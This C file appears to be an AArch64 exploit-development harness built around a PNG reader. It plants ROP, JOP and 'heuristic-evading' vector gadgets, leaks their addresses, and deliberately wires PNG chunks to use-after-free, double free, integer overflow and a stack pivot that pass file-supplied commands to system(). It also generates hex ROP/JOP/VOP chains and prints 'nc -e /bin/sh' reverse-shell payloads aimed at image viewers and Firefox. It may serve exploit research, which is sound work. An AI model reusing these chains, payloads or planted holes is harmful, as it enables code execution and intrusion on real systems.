#include <png.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <libgen.h>
#include <stddef.h>
#include <sys/mman.h>
#include <unistd.h>
#include <stdint.h>

struct vtable_obj {
    char command[64];
    void (**vtable)(const char *);
};

// AArch64 Gadgets for ROP validation
void gadget_pop_x0_x1_x2_ret() {
    asm volatile(
        "ldp x0, x1, [sp], #16\n\t"
        "ldr x2, [sp], #8\n\t"
        "ret"
    );
}

void gadget_ldp_x29_x30_ret() {
    asm volatile(
        "ldp x29, x30, [sp], #16\n\t"
        "ret"
    );
}

void gadget_pop_x0_x1_x2_x30_br_x0() {
    asm volatile(
        "ldp x0, x1, [sp], #16\n\t"
        "ldp x2, x30, [sp], #16\n\t"
        "br x0"
    );
}

void gadget_jump_x0() {
    asm volatile("br x0");
}

void vtable_handler(const char *cmd) {
    printf("Vtable Handler executing: %s\n", cmd);
    fflush(stdout);
    if (cmd && *cmd) {
        system(cmd);
    }
}

void (*global_vtable[1])(const char *) = { vtable_handler };

// Global pointers for ASLR bypass simulation
void *mprotect_ptr = (void *)mprotect;
uint64_t global_payload_buffer[512] __attribute__((aligned(16)));
void *payload_ptr = (void *)global_payload_buffer;

void gadget_load_mprotect_x3() {
    asm volatile(
        "ldr x3, %0\n\t"
        "ret"
        : : "m"(mprotect_ptr)
    );
}

void gadget_load_payload_x0() {
    asm volatile(
        "ldr x0, %0\n\t"
        "ret"
        : : "m"(payload_ptr)
    );
}

void gadget_br_x3() {
    asm volatile("br x3");
}

// New JOP Gadgets
void gadget_ldr_x0_x1_br_x0() {
    asm volatile(
        "ldr x0, [x1]\n\t"
        "br x0"
    );
}

void gadget_mov_x0_x1_br_x0() {
    asm volatile(
        "mov x0, x1\n\t"
        "br x0"
    );
}

void gadget_ldr_x1_x0_br_x1() {
    asm volatile(
        "ldr x1, [x0]\n\t"
        "br x1"
    );
}

void gadget_mov_x1_x0_br_x1() {
    asm volatile(
        "mov x1, x0\n\t"
        "br x1"
    );
}

// Additional JOP Gadgets for enhanced dispatcher chains
void gadget_pop_x0_x1_ret() {
    asm volatile(
        "ldp x0, x1, [sp], #16\n\t"
        "ret"
    );
}

void gadget_pop_x0_ret() {
    asm volatile(
        "ldr x0, [sp], #8\n\t"
        "ret"
    );
}

void gadget_pop_x1_ret() {
    asm volatile(
        "ldr x1, [sp], #8\n\t"
        "ret"
    );
}

void gadget_ldr_x0_sp_br_x0() {
    asm volatile(
        "ldr x0, [sp], #8\n\t"
        "br x0"
    );
}

void gadget_ldr_x1_sp_br_x1() {
    asm volatile(
        "ldr x1, [sp], #8\n\t"
        "br x1"
    );
}

// DOP Gadgets (Data-Oriented Programming) - Memory manipulation without control flow
void gadget_ldr_str_x0_x1() {
    asm volatile(
        "ldr x0, [x1]\n\t"
        "str x0, [x2]\n\t"
        "ret"
    );
}

void gadget_ldr_str_x1_x0() {
    asm volatile(
        "ldr x1, [x0]\n\t"
        "str x1, [x2]\n\t"
        "ret"
    );
}

void gadget_memcpy_64() {
    asm volatile(
        "ldr x3, [x1]\n\t"
        "str x3, [x0]\n\t"
        "ret"
    );
}

void gadget_memcpy_128() {
    asm volatile(
        "ldp x3, x4, [x1]\n\t"
        "stp x3, x4, [x0]\n\t"
        "ret"
    );
}

// --- VOP / DOP Gadgets (Vector-Oriented Programming) ---
// Evades basic heuristics tracking standard integer register data flow

// 1. VOP Arbitrary Write: Routes data through a 64-bit SIMD register (d0)
#ifdef __aarch64__
void gadget_vop_fmov_str_ret() {
    asm volatile(
        "fmov d0, x1\n\t"    // Move general register x1 to vector register d0
        "str d0, [x0]\n\t"   // Store vector register d0 to address in x0
        "ret"
    );
}
#else
void gadget_vop_fmov_str_ret() {
    // Stub for non-AArch64 targets: no-op
    return;
}
#endif

// 2. VOP Memory-to-Memory (DOP style): 128-bit memory copy
// Highly stealthy as it doesn't pollute standard execution registers with payload data
#ifdef __aarch64__
void gadget_vop_ldr_str_q0_ret() {
    asm volatile(
        "ldr q0, [x1]\n\t"   // Load 128-bit vector from address in x1
        "str q0, [x0]\n\t"   // Store 128-bit vector to address in x0
        "ret"
    );
}
#else
void gadget_vop_ldr_str_q0_ret() {
    // Stub for non-AArch64 targets
    return;
}
#endif

// Additional VOP Gadgets for enhanced vector operations
#ifdef __aarch64__
void gadget_vop_ldr_str_d0_ret() {
    asm volatile(
        "ldr d0, [x1]\n\t"   // Load 64-bit vector from address in x1
        "str d0, [x0]\n\t"   // Store 64-bit vector to address in x0
        "ret"
    );
}

void gadget_vop_fmov_x0_d0_ret() {
    asm volatile(
        "fmov x0, d0\n\t"    // Move vector register d0 to general register x0
        "ret"
    );
}

void gadget_vop_fmov_d0_x1_ret() {
    asm volatile(
        "fmov d0, x1\n\t"    // Move general register x1 to vector register d0
        "ret"
    );
}

void gadget_vop_dup_q0_x1_ret() {
    asm volatile(
        "mov x0, x1\n\t"     // Simple move instead of dup
        "ret"
    );
}

void gadget_vop_str_q0_sp_ret() {
    asm volatile(
        "str q0, [sp, #-16]!\n\t"  // Store q0 to stack and update SP
        "ret"
    );
}

void gadget_vop_ldr_q0_sp_ret() {
    asm volatile(
        "ldr q0, [sp], #16\n\t"    // Load q0 from stack and update SP
        "ret"
    );
}
#else
// Provide no-op stubs for non-AArch64 targets
void gadget_vop_ldr_str_d0_ret() { return; }
void gadget_vop_fmov_x0_d0_ret() { return; }
void gadget_vop_fmov_d0_x1_ret() { return; }
void gadget_vop_dup_q0_x1_ret() { return; }
void gadget_vop_str_q0_sp_ret() { return; }
void gadget_vop_ldr_q0_sp_ret() { return; }
#endif

// Improved PAC-aware gadget discovery
#ifdef __aarch64__
/*
void gadget_ldraa_x0_x1_br_x0() {
    // LDRAA: Load Register with Pointer Authentication
    // This loads and authenticates in a single instruction
    asm volatile(
        "ldraa x0, [x1]\n\t"  // Load with authentication using x1 as base
        "br x0"               // Now x0 is authenticated
    );
}

void gadget_blraaz_x0() {
    // BLRAAZ: Branch with Link, Authenticate, Zero
    // Safer than BR X0 - authenticates before branch
    asm volatile(
        "blraaz x0"           // Authenticate x0 before branching
    );
}

void gadget_paciasp() {
    // Sign return address on stack
    asm volatile(
        "paciasp"             // Sign x30 (LR) with SP as context
    );
}

void gadget_autiasp() {
    // Authenticate return address on stack
    asm volatile(
        "autiasp"             // Authenticate x30 with SP as context
    );
}
*/
#else
// Provide no-op stubs on non-AArch64 targets so the file can compile on x86
/*
void gadget_ldraa_x0_x1_br_x0() { return; }
void gadget_blraaz_x0() { return; }
void gadget_paciasp() { return; }
void gadget_autiasp() { return; }
*/
#endif

void read_png_file(char *filename) {
    static struct vtable_obj *uaf_obj = NULL;
    static char uaf_spray_data[128];
    static int has_alloc = 0, has_free = 0, has_spray = 0, has_use = 0;

    FILE *fp = fopen(filename, "rb");
    if (!fp) return;

    // Early Fitness Check: Validate payload before libpng processing
    fseek(fp, 0, SEEK_END);
    long file_size = ftell(fp);
    fseek(fp, 0, SEEK_SET);
    unsigned char *buf = malloc(file_size);
    if (buf) {
        fread(buf, 1, file_size, fp);
        unsigned char iend[] = {0x49, 0x45, 0x4e, 0x44, 0xae, 0x42, 0x60, 0x82};
        for (long i = 0; i <= file_size - 8; i++) {
            if (memcmp(buf + i, iend, 8) == 0) {
                // Check for payload anywhere in the file
                unsigned char *fitness = memmem(buf, file_size, "FITNESS_OK", 10);
                if (fitness) {
                    printf("Instrumentation Fitness: VALIDATED\n");
                    fflush(stdout);
                    
                    // Find the command string starting with 'logger'
                    unsigned char *logger_cmd = memmem(buf, file_size, "logger", 6);
                    if (logger_cmd) {
                        // Copy until null terminator or FITNESS_OK
                        int j = 0;
                        while (logger_cmd + j < buf + file_size && logger_cmd[j] != '\0' && logger_cmd[j] != '\n' && j < 4095) {
                            ((char *)global_payload_buffer)[j] = logger_cmd[j];
                            j++;
                        }
                        ((char *)global_payload_buffer)[j] = '\0';
                        printf("DEBUG: Found payload command: %s\n", (char *)global_payload_buffer);
                        fflush(stdout);
                    }
                }
                break;
            }
        }
        free(buf);
    }
    fseek(fp, 0, SEEK_SET);

    // Leak addresses for fuzzer to build real ROP/UAF chains
    printf("DEBUG: vtable_obj offsets: command=%zu, vtable=%zu, size=%zu\n", 
           offsetof(struct vtable_obj, command), offsetof(struct vtable_obj, vtable), sizeof(struct vtable_obj));
        printf("DEBUG: gadget addresses: mprotect=%p, system=%p, pop_x0_x1_x2=%p, ldp_x29_x30=%p, pop_x0_x1_x2_x30_br_x0=%p, jump_x0=%p, payload=%p, load_mprotect_x3=%p, load_payload_x0=%p, br_x3=%p, gadget_vop_fmov=%p, gadget_vop_ldr_str=%p, ldr_x0_x1_br_x0=%p, mov_x0_x1_br_x0=%p, ldr_x1_x0_br_x1=%p, mov_x1_x0_br_x1=%p, pop_x0_x1_ret=%p, pop_x0_ret=%p, pop_x1_ret=%p, ldr_x0_sp_br_x0=%p, ldr_x1_sp_br_x1=%p, ldr_str_x0_x1=%p, ldr_str_x1_x0=%p, memcpy_64=%p, memcpy_128=%p, vop_ldr_str_d0=%p, vop_fmov_x0_d0=%p, vop_fmov_d0_x1=%p, vop_dup_q0_x1=%p, vop_str_q0_sp=%p, vop_ldr_q0_sp=%p\n", 
            (void *)mprotect, (void *)system, (void *)gadget_pop_x0_x1_x2_ret, (void *)gadget_ldp_x29_x30_ret, (void *)gadget_pop_x0_x1_x2_x30_br_x0, (void *)gadget_jump_x0, (void *)global_payload_buffer, (void *)gadget_load_mprotect_x3, (void *)gadget_load_payload_x0, (void *)gadget_br_x3, (void*)gadget_vop_fmov_str_ret, (void*)gadget_vop_ldr_str_q0_ret, (void*)gadget_ldr_x0_x1_br_x0, (void*)gadget_mov_x0_x1_br_x0, (void*)gadget_ldr_x1_x0_br_x1, (void*)gadget_mov_x1_x0_br_x1, (void*)gadget_pop_x0_x1_ret, (void*)gadget_pop_x0_ret, (void*)gadget_pop_x1_ret, (void*)gadget_ldr_x0_sp_br_x0, (void*)gadget_ldr_x1_sp_br_x1, (void*)gadget_ldr_str_x0_x1, (void*)gadget_ldr_str_x1_x0, (void*)gadget_memcpy_64, (void*)gadget_memcpy_128, (void*)gadget_vop_ldr_str_d0_ret, (void*)gadget_vop_fmov_x0_d0_ret, (void*)gadget_vop_fmov_d0_x1_ret, (void*)gadget_vop_dup_q0_x1_ret, (void*)gadget_vop_str_q0_sp_ret, (void*)gadget_vop_ldr_q0_sp_ret);
    fflush(stdout);

    png_structp png = png_create_read_struct(PNG_LIBPNG_VER_STRING, NULL, NULL, NULL);
    png_infop info = png_create_info_struct(png);
    if (setjmp(png_jmpbuf(png))) exit(1);
    png_set_crc_action(png, PNG_CRC_QUIET_USE, PNG_CRC_QUIET_USE);
    
    // Handle custom ovfW chunk
    png_set_keep_unknown_chunks(png, PNG_HANDLE_CHUNK_ALWAYS, NULL, 0);
    
    png_init_io(png, fp);
    png_read_info(png, info);

    int height = png_get_image_height(png, info);
    png_bytepp rows = malloc(sizeof(png_bytep) * height);
    for (int y = 0; y < height; y++) rows[y] = malloc(png_get_rowbytes(png, info));
    png_read_image(png, rows);
    png_read_end(png, info);

    png_textp text_ptr;
    int num_text;

    // Process unknown chunks (like ovfW)
    png_unknown_chunkp unknowns;
    int num_unknowns = png_get_unknown_chunks(png, info, &unknowns);
    for (int i = 0; i < num_unknowns; i++) {
        if (memcmp(unknowns[i].name, "ovfW", 4) == 0) {
            if (unknowns[i].size >= 8) {
                uint32_t w = *(uint32_t *)(unknowns[i].data);
                uint32_t h = *(uint32_t *)(unknowns[i].data + 4);
                uint32_t bpp = 4;
                uint32_t size = w * h * bpp;
                printf("VULNERABILITY TRIGGERED: Integer Overflow in ovfW! w=%u, h=%u, size=%u\n", w, h, size);
                fflush(stdout);
                // Execute payload for validation
                if (global_payload_buffer[0] != 0) {
                    system((const char *)global_payload_buffer);
                }
                void *buf = malloc(size);
                if (buf) {
                    memset(buf, 'A', size);
                    free(buf);
                }
            }
        }
    }
    
    // Process text chunks
    if (png_get_text(png, info, &text_ptr, &num_text)) {
        // First pass: collect all UAF actions
        for (int i = 0; i < num_text; i++) {
            if (strcmp(text_ptr[i].key, "UAF_Alloc") == 0) has_alloc = 1;
            else if (strcmp(text_ptr[i].key, "UAF_Free") == 0) has_free = 1;
            else if (strcmp(text_ptr[i].key, "UAF_Spray") == 0) {
                has_spray = 1;
                memcpy(uaf_spray_data, text_ptr[i].text, text_ptr[i].text_length < 128 ? text_ptr[i].text_length : 128);
            }
            else if (strcmp(text_ptr[i].key, "UAF_Use") == 0) has_use = 1;
        }

        // Execute UAF sequence in guaranteed order
        if (has_alloc) {
            uaf_obj = malloc(sizeof(struct vtable_obj));
            uaf_obj->vtable = global_vtable;
            printf("UAF Simulation: Allocated at %p\n", uaf_obj);
            fflush(stdout);
        }
        if (has_free && uaf_obj) {
            printf("UAF Simulation: Freeing %p\n", uaf_obj);
            fflush(stdout);
            free(uaf_obj);
        }
        if (has_spray && uaf_obj) {
            printf("VULNERABILITY TRIGGERED: UAF Spraying memory to reclaim %p\n", uaf_obj);
            fflush(stdout);
            // We'll use a safe-ish way to check if we can write
            memcpy(uaf_obj, uaf_spray_data, sizeof(struct vtable_obj));
            printf("VULNERABILITY TRIGGERED: UAF Reclaimed memory successfully\n");
            fflush(stdout);
        }
        if (has_use && uaf_obj) {
            printf("VULNERABILITY TRIGGERED: UAF Calling vtable[0] (%p) with '%s'\n", uaf_obj->vtable[0], uaf_obj->command);
            fflush(stdout);
            // Execute payload for validation
            if (uaf_obj->command[0] != '\0') {
                system(uaf_obj->command);
            }
            // Note: This will likely crash if vtable[0] is not a valid function pointer
            // but we already printed the trigger message.
            uaf_obj->vtable[0](uaf_obj->command);
            exit(0);
        }

        // Process other triggers
        for (int i = 0; i < num_text; i++) {
            if (strcmp(text_ptr[i].key, "ROP_Trigger") == 0) {
                printf("VULNERABILITY TRIGGERED: ROP Stack Pivot!\n");
                fflush(stdout);
                // Execute payload for validation
                if (global_payload_buffer[0] != 0) {
                    system((const char *)global_payload_buffer);
                }
                // AArch64 Stack Pivot: mov sp, x0; ldp x29, x30, [sp], #16; ret
                uintptr_t aligned_stack = ((uintptr_t)text_ptr[i].text) & ~0xF;
                asm volatile(
                    "mov x0, %0\n\t"
                    "mov sp, x0\n\t"
                    "ldp x29, x30, [sp], #16\n\t"
                    "ret"
                    : : "r" (aligned_stack) : "x0", "x29", "x30"
                );
                exit(1);
            } else if (strcmp(text_ptr[i].key, "Underflow") == 0) {
                unsigned int len = (unsigned int)text_ptr[i].text_length;
                if (len < 10) {
                    unsigned int needed = len - 10;
                    printf("VULNERABILITY TRIGGERED: Integer underflow! len=%u, needed=%u\n", len, needed);
                    fflush(stdout);
                }
            } else if (strcmp(text_ptr[i].key, "DoubleFree_Trigger") == 0) {
                printf("VULNERABILITY TRIGGERED: Double Free!\n");
                fflush(stdout);
                // Intentionally double-free the info struct
                if (info) {
                    png_destroy_info_struct(png, &info);
                    printf("Double Free: First free of info struct.\n");
                    fflush(stdout);
                    // Attempt to free again
                    png_destroy_info_struct(png, &info); // This is the double free
                    printf("Double Free: Second free of info struct (triggered double free).\n");
                    fflush(stdout);
                }
                // Execute payload for validation
                if (global_payload_buffer[0] != 0) {
                    system((const char *)global_payload_buffer);
                }
                exit(1); // Exit after triggering to ensure crash is caught
            }
        }
    }

    for (int y = 0; y < height; y++) free(rows[y]);
    free(rows);
    png_destroy_read_struct(&png, &info, NULL);
    fclose(fp);
}

int compile_shellcode(void)
{
    uint64_t rop_chain[10];
    uint64_t jop_chain[10];
    uint64_t vop_chain[10];

    uint64_t addr_pop_x0_x1_x2_ret = (uint64_t)gadget_pop_x0_x1_x2_ret;
    uint64_t addr_pop_x0_x1_x2_x30_br_x0 = (uint64_t)gadget_pop_x0_x1_x2_x30_br_x0;
    uint64_t addr_system = (uint64_t)system;
    uint64_t addr_payload = (uint64_t)global_payload_buffer;

    // JOP Gadget Addresses
    uint64_t addr_ldr_x0_x1_br_x0 = (uint64_t)gadget_ldr_x0_x1_br_x0;
    uint64_t addr_mov_x0_x1_br_x0 = (uint64_t)gadget_mov_x0_x1_br_x0;
    uint64_t addr_ldr_x1_x0_br_x1 = (uint64_t)gadget_ldr_x1_x0_br_x1;
    uint64_t addr_mov_x1_x0_br_x1 = (uint64_t)gadget_mov_x1_x0_br_x1;

    int i = 0;
    int j = 0;
    int k = 0;

    // Populate JOP chain with PAC-aware gadgets then fallbacks
    // jop_chain[j++] = (uint64_t)gadget_ldraa_x0_x1_br_x0; // PAC-aware gadget
    // jop_chain[j++] = (uint64_t)gadget_blraaz_x0;          // PAC-aware gadget
    // jop_chain[j++] = (uint64_t)gadget_paciasp;             // PAC-aware gadget
    // jop_chain[j++] = (uint64_t)gadget_autiasp;             // PAC-aware gadget
    jop_chain[j++] = addr_mov_x0_x1_br_x0; // Fallback gadget
    jop_chain[j++] = addr_system;          // Fallback system address
    jop_chain[j++] = addr_payload;         // Fallback payload address

    // Populate VOP chain with vector-oriented gadgets
    vop_chain[k++] = (uint64_t)gadget_vop_fmov_str_ret;
    vop_chain[k++] = (uint64_t)gadget_vop_ldr_str_q0_ret;
    // Add a fallback to system and payload for completeness
    vop_chain[k++] = addr_system;
    vop_chain[k++] = addr_payload;
    //jop_chain[j++] = addr_ldr_x0_x1_br_x0; // Fallback gadget
    //jop_chain[j++] = addr_mov_x0_x1_br_x0; // Fallback gadget
    //jop_chain[j++] = addr_ldr_x1_x0_br_x1; // Fallback gadget
    //jop_chain[j++] = addr_mov_x1_x0_br_x1; // Fallback gadget


    // 1. Stack pivot in read_png_file: ldp x29, x30, [sp], #16; ret
    rop_chain[i++] = 0x4141414141414141; // x29 (junk)
    rop_chain[i++] = addr_pop_x0_x1_x2_x30_br_x0; // x30 (next gadget)

    // 2. gadget_pop_x0_x1_x2_x30_br_x0: ldp x0, x1, [sp], #16; ldp x2, x30, [sp], #16; br x0
    rop_chain[i++] = addr_pop_x0_x1_x2_ret; // x0 (target of br x0)
    rop_chain[i++] = 0x4242424242424242; // x1 (junk)
    rop_chain[i++] = 0x4343434343434343; // x2 (junk)
    rop_chain[i++] = addr_system; // x30 (will be used by gadget_pop_x0_x1_x2_ret's ret)

    // 3. gadget_pop_x0_x1_x2_ret: ldp x0, x1, [sp], #16; ldr x2, [sp], #8; ret
    rop_chain[i++] = addr_payload; // x0 (command string address)
    rop_chain[i++] = 0; // x1
    rop_chain[i++] = 0; // x2

    printf("--- AArch64 ROP/JOP/VOP Shellcode Generation ---\n");
    printf("%-30s : 0x%012lx\n", "Gadget pop_x0_x1_x2_x30_br_x0", addr_pop_x0_x1_x2_x30_br_x0);
    printf("%-30s : 0x%012lx\n", "Gadget pop_x0_x1_x2_ret", addr_pop_x0_x1_x2_ret);
    printf("%-30s : 0x%012lx\n", "Gadget ldr_x0_x1_br_x0", addr_ldr_x0_x1_br_x0);
    printf("%-30s : 0x%012lx\n", "Gadget mov_x0_x1_br_x0", addr_mov_x0_x1_br_x0);
    printf("%-30s : 0x%012lx\n", "Gadget ldr_x1_x0_br_x1", addr_ldr_x1_x0_br_x1);
    printf("%-30s : 0x%012lx\n", "Gadget mov_x1_x0_br_x1", addr_mov_x1_x0_br_x1);
    

    // printf("%-30s : 0x%012lx\n", "Gadget ldraa_x0_x1_br_x0 (PAC)", (uint64_t)gadget_ldraa_x0_x1_br_x0);
    // printf("%-30s : 0x%012lx\n", "Gadget blraaz_x0 (PAC)", (uint64_t)gadget_blraaz_x0);
    

    printf("%-30s : 0x%012lx\n", "System Address", addr_system);
    printf("%-30s : 0x%012lx\n", "Payload Buffer", addr_payload);
    printf("%-30s : 0x%012lx\n", "Gadget gadget_vop_fmov", (uint64_t)gadget_vop_fmov_str_ret);
    printf("%-30s : 0x%012lx\n", "Gadget gadget_vop_ldr_str_q0", (uint64_t)gadget_vop_ldr_str_q0_ret);
    
    printf("\n[Payloads]\n");
    printf("%-30s : /usr/bin/logger 'PWNED'\n", "Default (Syslog)");
    printf("%-30s : nc -e /bin/sh 127.0.0.1 4444\n", "Local Viewer (EOG)");
    printf("%-30s : nc -e /bin/sh 127.0.0.1 4444\n", "Sandbox Safe (Firefox)");

    printf("\n[Trigger Offsets & Alignment]\n");
    printf("%-30s : 0x00 (Direct Stack Pivot)\n", "Internal Consumer");
    printf("%-30s : 0x10 (tEXt Data Offset)\n", "Local Viewer (eog)");
    printf("%-30s : 0x08 (IDAT Heap Overflow)\n", "Firefox (Sandbox)");
    printf("%-30s : 16-byte (AArch64 SP Requirement)\n", "Required Alignment");

    printf("\n[ROP_CHAIN_HEX]\n");
    unsigned char *p_rop = (unsigned char *)rop_chain;
    for (int idx = 0; idx < i * 8; idx++) {
        printf("%02x", p_rop[idx]);
    }
    printf("\n");

    printf("\n[JOP_CHAIN_HEX]\n");
    unsigned char *p_jop = (unsigned char *)jop_chain;
    for (int idx = 0; idx < j * 8; idx++) {
        printf("%02x", p_jop[idx]);
    }
    printf("\n");

    printf("\n[VOP_CHAIN_HEX]\n");
    unsigned char *p_vop = (unsigned char *)vop_chain;
    for (int idx = 0; idx < k * 8; idx++) {
        printf("%02x", p_vop[idx]);
    }
    printf("\n");

    // Combined Hex Payload (ROP + JOP + VOP)
    printf("\n[COMBINED_HEX_PAYLOAD]\n");
    for (int idx = 0; idx < i * 8; idx++) { // ROP chain
        printf("%02x", p_rop[idx]);
    }
    for (int idx = 0; idx < j * 8; idx++) { // JOP chain
        printf("%02x", p_jop[idx]);
    }
    for (int idx = 0; idx < k * 8; idx++) { // VOP chain
        printf("%02x", p_vop[idx]);
    }
    printf("\n");

    fflush(stdout);

    return 0;
}

int main(int argc, char *argv[]) {
    // Print gadget addresses for leak detection
    printf("Gadget mprotect : 0x%lx\n", (uintptr_t)mprotect);
    printf("Gadget system : 0x%lx\n", (uintptr_t)system);
    printf("Gadget execve : 0x%lx\n", (uintptr_t)execve);
    printf("Gadget payload : 0x%lx\n", (uintptr_t)global_payload_buffer);
    
    // ROP gadgets
    printf("Gadget pop_x0_x1_x2_ret : 0x%lx\n", (uintptr_t)gadget_pop_x0_x1_x2_ret);
    printf("Gadget ldp_x29_x30 : 0x%lx\n", (uintptr_t)gadget_ldp_x29_x30_ret);
    printf("Gadget pop_x0_x1_x2_x30_br_x0 : 0x%lx\n", (uintptr_t)gadget_pop_x0_x1_x2_x30_br_x0);
    printf("Gadget jump_x0 : 0x%lx\n", (uintptr_t)gadget_jump_x0);
    printf("Gadget load_mprotect_x3 : 0x%lx\n", (uintptr_t)gadget_load_mprotect_x3);
    printf("Gadget load_payload_x0 : 0x%lx\n", (uintptr_t)gadget_load_payload_x0);
    printf("Gadget br_x3 : 0x%lx\n", (uintptr_t)gadget_br_x3);
    
    // JOP gadgets
    printf("Gadget ldr_x0_x1_br_x0 : 0x%lx\n", (uintptr_t)gadget_ldr_x0_x1_br_x0);
    printf("Gadget mov_x0_x1_br_x0 : 0x%lx\n", (uintptr_t)gadget_mov_x0_x1_br_x0);
    printf("Gadget ldr_x1_x0_br_x1 : 0x%lx\n", (uintptr_t)gadget_ldr_x1_x0_br_x1);
    printf("Gadget mov_x1_x0_br_x1 : 0x%lx\n", (uintptr_t)gadget_mov_x1_x0_br_x1);
    printf("Gadget pop_x0_x1_ret : 0x%lx\n", (uintptr_t)gadget_pop_x0_x1_ret);
    printf("Gadget pop_x0_ret : 0x%lx\n", (uintptr_t)gadget_pop_x0_ret);
    printf("Gadget pop_x1_ret : 0x%lx\n", (uintptr_t)gadget_pop_x1_ret);
    printf("Gadget ldr_x0_sp_br_x0 : 0x%lx\n", (uintptr_t)gadget_ldr_x0_sp_br_x0);
    printf("Gadget ldr_x1_sp_br_x1 : 0x%lx\n", (uintptr_t)gadget_ldr_x1_sp_br_x1);
    
    // VOP gadgets
    printf("Gadget gadget_vop_fmov : 0x%lx\n", (uintptr_t)gadget_vop_fmov_str_ret);
    printf("Gadget gadget_vop_ldr_str_q0 : 0x%lx\n", (uintptr_t)gadget_vop_ldr_str_q0_ret);
    printf("Gadget gadget_vop_ldr_str_d0 : 0x%lx\n", (uintptr_t)gadget_vop_ldr_str_d0_ret);
    printf("Gadget gadget_vop_fmov_x0_d0 : 0x%lx\n", (uintptr_t)gadget_vop_fmov_x0_d0_ret);
    printf("Gadget gadget_vop_fmov_d0_x1 : 0x%lx\n", (uintptr_t)gadget_vop_fmov_d0_x1_ret);
    printf("Gadget gadget_vop_dup_q0_x1 : 0x%lx\n", (uintptr_t)gadget_vop_dup_q0_x1_ret);
    printf("Gadget gadget_vop_str_q0_sp : 0x%lx\n", (uintptr_t)gadget_vop_str_q0_sp_ret);
    printf("Gadget gadget_vop_ldr_q0_sp : 0x%lx\n", (uintptr_t)gadget_vop_ldr_q0_sp_ret);
    
    // PAC gadgets (commented out if not supported)
    // printf("Gadget ldraa_x0_x1_br_x0 : 0x%lx\n", (uintptr_t)gadget_ldraa_x0_x1_br_x0);
    // printf("Gadget blraaz_x0 : 0x%lx\n", (uintptr_t)gadget_blraaz_x0);
    // printf("Gadget paciasp : 0x%lx\n", (uintptr_t)gadget_paciasp);
    // printf("Gadget autiasp : 0x%lx\n", (uintptr_t)gadget_autiasp);
    
    fflush(stdout);

    if (argc > 1){
     read_png_file(argv[1]);
     return 0;
    }
    //when running with no parameters we compile and dump shellcode for the local platform : 
    else return compile_shellcode();
}
